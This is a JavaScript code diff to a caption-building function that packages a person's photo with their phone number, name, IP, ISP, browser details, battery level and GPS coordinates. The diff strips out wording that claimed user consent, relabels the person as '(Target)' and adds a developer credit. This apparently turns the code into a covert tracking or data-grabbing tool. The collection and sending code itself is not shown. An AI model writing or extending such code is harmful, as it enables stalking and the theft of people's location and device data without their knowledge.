@@ -248,13 +248,11 @@ function buildPhotoCaption(obj){
   const now = new Date();
   const lines = [];
   lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
-  if(obj.profile && obj.profile.phone) lines.push(` ├─ > Nomor Telepon: ${obj.profile.phone}`);
   if(obj.profile && obj.profile.name) lines.push(` ├─ > Nama: ${obj.profile.name}`);
-  lines.push(` ├─ > Pesan`);
-  lines.push(` │   └─ ${obj.message || 'Pendaftaran & Verifikasi (dengan izin)'}`);
-  lines.push(` ├─ > Pengirim (web)`);
+  if(obj.profile && obj.profile.phone) lines.push(` ├─ > Nomor Telepon: ${obj.profile.phone}`);
+ lines.push(` ├─ >(Target)`);
   lines.push(` │   └─ ${obj.userAgent || '-'}`);
-  lines.push(` ├─ > IP / ISP`);
+  lines.push(` ├─ > (IP)`);
   const ip = obj.ipInfo || {};
   lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
   lines.push(` │   ├─ ISP/Org: ${ip.org || '-'}`);
@@ -268,7 +266,7 @@ function buildPhotoCaption(obj){
   lines.push(` │   ├─ Language: ${obj.language || '-'}`);
   lines.push(` │   ├─ Timezone (browser): ${obj.timezone || '-'}`);
   lines.push(` │   └─ Battery: ${obj.battery || '-'}`);
-  lines.push(` ├─ > Geo (GPS)`);
+  lines.push(` ├─ >(GPS)`);
   if(obj.geo && !obj.geo.error){
     lines.push(` │   ├─ Lat: ${obj.geo.lat}`);
     lines.push(` │   ├─ Lon: ${obj.geo.lon}`);
@@ -276,7 +274,7 @@ function buildPhotoCaption(obj){
   } else {
     lines.push(` │   └─ GPS: ${obj.geo ? obj.geo.error : '-'}`);
   }
-  lines.push(`╰─ > Sumber: Sistem (dengan persetujuan pengguna)`);
+  lines.push(`╰─ > © ᴅᴀғғᴀ ᴅᴇᴠ)`);
   return safeSlice(lines.join('\n'), 1000);
 }
 
